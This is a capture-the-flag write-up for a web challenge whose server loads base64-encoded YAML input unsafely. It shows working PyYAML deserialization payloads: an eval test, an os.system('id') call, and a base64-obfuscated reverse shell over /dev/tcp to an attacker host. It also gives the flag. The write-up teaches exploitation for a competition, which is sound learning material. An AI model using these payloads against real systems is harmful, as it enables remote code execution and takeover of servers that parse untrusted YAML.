# Loader challenge Writeup : 

- Challenge Name : Loader

- Weight : 400 pts



TL;DR : Exploiting a Python De-Serialization leading to an RCE thanks To yaml/PyYaml.



This is the main challenge page "adminer loader" with a data submission form.

 ![gif here](https://raw.githubusercontent.com/TebbaaX/CTFs/main/HackerNewsBdarija-CTF-2022/loadder/loader/loadder_x.gif?token=GHSAT0AAAAAABTT5PBKXFRB2D3HCN5AH6JMYS6DYIA)




as you can see! you simply submit an input text and it get reflected/alerted.



looking under the hood we have this interesting js script that actually posts data on `api/load`, and after posting it! it gets alerted.

 ![gif here](https://raw.githubusercontent.com/TebbaaX/CTFs/main/HackerNewsBdarija-CTF-2022/loadder/loader/magic_behind.PNG?token=GHSAT0AAAAAABTT5PBLQKOWFT3YEZU5CLYGYS6DZBQ)

one more interesting thing is the `btoa()` js function that converts the input string to an base64. confirmed by intercepting the request on burp as shown.
the response also show an interesting server header indicating that this runs on py.

 ![gif here](https://raw.githubusercontent.com/TebbaaX/CTFs/main/HackerNewsBdarija-CTF-2022/loadder/loader/burp_2.PNG?token=GHSAT0AAAAAABTT5PBKYKRVP6QCZJV6PTIIYS6D2OQ)

Challenge hint mentioned a data format used by SOC Team leads and Threat hunters, after some time it was obviously yaml.


> .... (and) YAML is a human-readable data-serialization language. It is commonly used for configuration files and in applications where data is being stored...

spent sometime reading papers and references along with g0rchy ended up with constructing a "checkup payload" to check if we really about to solve this challenge. 



checkup payload looked like this : 

> `!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ '1+1' ]]]`

simple `!!python/object/new:tuple` to initiate a tuple since were running on YAML...,  `map()` to serve both the function and the iterable that will be "mapped" and `eval()` to check the legality of the python statement... and you know 1+1 :) .

![gif here](https://raw.githubusercontent.com/TebbaaX/CTFs/main/HackerNewsBdarija-CTF-2022/loadder/loader/2pic.PNG?token=GHSAT0AAAAAABTT5PBLCZN7BLXBWBDRYV2WYS6D3WQ)

seems like we are in the correct direction!


The second payload we did call python and tried to get at least the built-in python-id trace : 

> `!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "__import__('os').system('id')" ]]]`

Returned with the `os.system()` encoded exit value 0 that means success! well, that's great.

![gif here](https://raw.githubusercontent.com/TebbaaX/CTFs/main/HackerNewsBdarija-CTF-2022/loadder/loader/0.PNG?token=GHSAT0AAAAAABTT5PBKC4EECREKBIC4SE56YS6D44Q)

The last constructed payload is to get a bash rev shell

according to my teammate g0rchy in APTx1337 who likes keeping the team's work as based as possible we used base64 encoded bash reverse shell, and for the guys who can't handle based-ness you can use escaped quotes bash payloads!

the final payload looks like this : 


> ` !!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , [ "__import__('os').system('echo c2ggLWkgPiYgL2Rldi90Y3AvJExIT1NULyRMUE9SVCAwPiYx|base64 -d|bash')" ]]]`

and...


![gif here](https://raw.githubusercontent.com/TebbaaX/CTFs/main/HackerNewsBdarija-CTF-2022/loadder/loader/sweet.PNG?token=GHSAT0AAAAAABTT5PBLFAR3AI75T44PH4CSYS6D5XQ)












it works! 

> `thnb{py7H0N_P4Ck4935_c4N_83_4_d4n93R}`

References that helped us solving the challenge in references.txt 

GG!
